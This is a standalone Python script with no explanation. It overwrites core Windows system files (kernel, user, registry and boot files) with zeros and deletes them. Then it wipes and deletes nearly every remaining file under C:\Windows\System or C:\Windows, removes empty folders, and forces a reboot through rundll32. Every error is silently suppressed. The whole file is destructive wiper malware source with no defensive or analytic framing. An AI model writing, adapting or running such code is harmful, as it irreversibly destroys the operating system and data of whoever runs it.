import os
dl = []
windows_root_files = ['IO.SYS', 'MSDOS.SYS', 'WIN.COM', 'SYSTEM.DAT', 'USER.DAT', 'EXPLORER.EXE', 'PROGMAN.EXE']
windows_system_files = ['KERNEL32.DLL', 'USER32.DLL', 'GDI32.DLL', 'ADVAPI32.DLL', 'MSVCRT.DLL', 'VMM32.VXD', 'VDD.VXD', 'KRNL386.EXE', 'DDEML.DLL', 'COMDLG32.DLL', 'VERSION.DLL', 'NETAPI32.DLL', 'WSOCK32.DLL', 'OLE32.DLL', 'CRTDLL.DLL', 'GDIPLUS.DLL', 'MMSYSTEM.DLL', 'MMSOUND.DLL', 'SETUPAPI.DLL', 'VBRUNXXX.DLL', 'MSCOREE.DLL', 'MSHTML.DLL', 'COMCTL32.DLL']
for system_fn in windows_system_files:
    system_filepath = os.path.join(r"C:\Windows\System", system_fn) ; system_f = None
    try:
        system_fs = os.path.getsize(system_filepath) ; system_f = open(system_filepath, 'rb+'); system_f.seek(0) ; system_bw = 0
        while system_bw < system_fs:
            system_f.write('\x00' * min(4194304, system_fs - system_bw)) ; system_bw += min(4194304, system_fs - system_bw)
    except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
    if system_f: system_f.close()
    try: os.remove(system_filepath); dl.append(system_fn)
    except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
for root_fn in windows_root_files:
    root_filepath = os.path.join(r"C:\Windows", root_fn) ; root_f = None
    try:
        root_fs = os.path.getsize(root_filepath) ; root_f = open(root_filepath, 'rb+'); root_f.seek(0) ; root_bw = 0
        while root_bw < root_fs:
            root_f.write('\x00' * min(4194304, root_fs - root_bw)) ; root_bw += min(4194304, root_fs - root_bw)
    except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
    if root_f: root_f.close()
    try: os.remove(root_filepath); dl.append(root_fn)
    except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
if 'VMM32.VXD' not in dl:
    for r, _, fs_in_r in os.walk(r"C:\Windows\System"):
        for f in fs_in_r:
            if os.path.basename(f).lower() not in ['rundll32.exe', 'shell32.dll', 'command.com']:
                filepath = os.path.join(r, f) ; of = None
                try:
                    fs = os.path.getsize(filepath) ;of = open(filepath, 'rb+') ;of.seek(0) ;bw = 0
                    while bw < fs:
                        of.write('\x00' * min(4194304, fs - bw)) ; bw += min(4194304, fs - bw)
                except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
                if of: of.close()
                try: os.remove(filepath)
                except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
    for r, ds, fs_in_r in os.walk(r"C:\Windows\System", topdown=False):
        if not ds and not fs_in_r:
            try: os.rmdir(r)
            except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
if 'IO.SYS' not in dl:
    for r, _, fs_in_r in os.walk(r"C:\Windows"):
        for f in fs_in_r:
            if os.path.basename(f).lower() not in ['rundll32.exe', 'shell32.dll', 'command.com']:
                filepath = os.path.join(r, f) ; of = None
                try:
                    fs = os.path.getsize(filepath) ;of = open(filepath, 'rb+') ;of.seek(0) ;bw = 0
                    while bw < fs:
                        of.write('\x00' * min(4194304, fs - bw)) ; bw += min(4194304, fs - bw)
                except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
                if of: of.close()
                try: os.remove(filepath)
                except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
    for r, ds, fs_in_r in os.walk(r"C:\Windows", topdown=False):
        if not ds and not fs_in_r:
            try: os.rmdir(r)
            except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
try: os.system("rundll32.exe shell32.dll,SHExitWindowsEx 2")
except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
